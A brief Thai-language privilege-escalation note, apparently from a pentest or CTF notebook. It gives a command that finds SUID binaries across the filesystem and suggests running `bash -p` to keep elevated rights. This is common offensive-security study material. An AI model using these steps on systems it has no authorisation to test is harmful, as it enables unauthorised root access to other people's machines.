#privesc 
# Step
1. หาไฟล์ที่มี s ซึ่งแปลว่าตั้งค่าสิทธิ์แบบ SUID bit ไว้ ถ้าเปิดได้จะได้ สิทธิ์ของคนสร้างไฟล์นั้น
```bash
find / -perm -u=s -type f 2>/dev/null
```
2. ลองเปิดที่ find ได้ไปเรื่อยๆ
```bash
bash -p
```